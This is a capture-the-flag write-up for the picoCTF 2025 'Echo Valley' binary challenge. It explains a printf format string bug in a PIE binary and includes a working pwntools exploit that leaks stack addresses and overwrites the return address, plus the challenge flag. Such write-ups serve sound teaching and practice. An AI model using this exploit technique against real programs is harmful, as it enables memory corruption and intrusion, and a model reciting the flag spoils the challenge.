# Echo Valley #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2025, Format String, PIE

## Description ##
The echo valley is a simple function that echoes back whatever you say to it.
But how do you make it respond with something more interesting, like a flag?

## Approach ##
I am provided with a binary file called `valley` and a C file called `valley.c`. Inspecting the C file, I see that the `print_flag` function prints the flag, `echo_valley` function echoes back the user input:

    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);

 I noticed that printf directly prints buf without a format string, which allows a format string attack. I check the security features by `checksec`:

    Arch:     amd64
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes

So PIE is enabled, which means I need to calculate the base address and then use it to calculate the address of `print_flag`. I first find the offset of `main`, `print_flag`, and `echo_valley` by using `objdump -d valley`:

    0000000000001307 <echo_valley>:
    1307:       f3 0f 1e fa             endbr64
                    .
                    .
                    .
    1400:          c3                      ret

    0000000000001401 <main>:
    1401:       f3 0f 1e fa             endbr64
                    .
                    .
                    .
    1419:          c3                      ret

    0000000000001269 <print_flag>:
    1269:       f3 0f 1e fa             endbr64
                    .
                    .
                    .
    1302:       e8 69 fe ff ff          call   1170 <exit@plt>

Now I need to find a leak address that looks similar to either `main` address or `print_flag` address. This will allow me to calculate the base address, so opening up the binary file in gdb and entering a bunch of `%p`, I get:

    %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
    You heard in the distance: 0x7fffffffda50.(nil).(nil).(nil).0x410.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x2e7025.0xfe8f8026cf3a3e00.0x7fffffffdc80.0x555555555413.0x7fffffffdd20.0x7ffff7c2a1ca.0x7fffffffdcd0.0x7fffffffdda8.0x155554040.0x555555555401.0x7fffffffdda8.0xbaa717529932cfe7.0x1.(nil).0x555555557d78.0x7ffff7ffd000.You heard in the distance: 0x7fffffffda50.(nil)

At location 21, `0x555555555413`, that address seems to correspond to `1413: b8 00 00 00 00  mov  $0x0,%eax` in `main`. So I can use that to find my base address. Another thing I need to figure out is where is my return address in memory. If I can figure out where it is, then I can use `fmtstr_payload` (provided by pwntools) to replace the return address with the address of `print_flag`. So looking back at the leaked address I perform, it looks like the user input starts at location 6. At location 20, the value resembles a saved rbp, as stack addresses on x86_64 Linux typically fall in the 0x7ffffffffxxx range and appear immediately before the return address, so by subtracting that address by 8, I would get the memory address of where the return address is located. Now with all the information I have, I can craft my exploit:

    from pwn import *

    HOST = 'shape-facility.picoctf.net'
    PORT = 51726

    # Default to 32 bit if don't give context to fmt_str
    context.arch = 'amd64'

    p = remote(HOST, PORT) 

    # p = process('./valley')

    # Send input to leak address
    p.sendline(b'%20$p %21$p')

    # Get the leak address
    p.recvuntil(b'distance: ')
    rbp, main_address = p.recvline().split()

    rbp = int(rbp, 16)
    main_address = int(main_address, 16)

    print(f"rbp: {hex(rbp)}")
    print(f"main address: {hex(main_address)}")

    # Calculate the base address and win_address
    base_address = main_address - 0x1413
    win_address = base_address + 0x1269

    print(f"base address: {hex(base_address)}")

    # Payload script to overwrite return address value to print_flag address. Offset is 6 since that is where user input starts
    payload = fmtstr_payload(6, {rbp-8: win_address}, write_size='short')

    p.sendline(payload)

    p.sendline(b'exit')

    p.interactive()

Running the script, I got the flag! 

    Congrats! Here is your flag: picoctf{f1ckl3_f0rmat_f1asc0}

Flag: picoctf{f1ckl3_f0rmat_f1asc0}

## Reflection ## 
This challenge made use of a format string vulnerability together with PIE. One of the trickiest parts was building the exploit correctly. In particular, I needed to determine which leaked values corresponded to the return address. Initially, I tried to directly locate the memory address where the return address was stored. However, after several attempts, I realized that since the saved rbp was leaked, I could simply compute the return address location as `rbp - 8`, based on the standard x86_64 stack frame layout. All in all, this is a good exercise to practice beating PIE and use of the `fmtstr_payload` function.


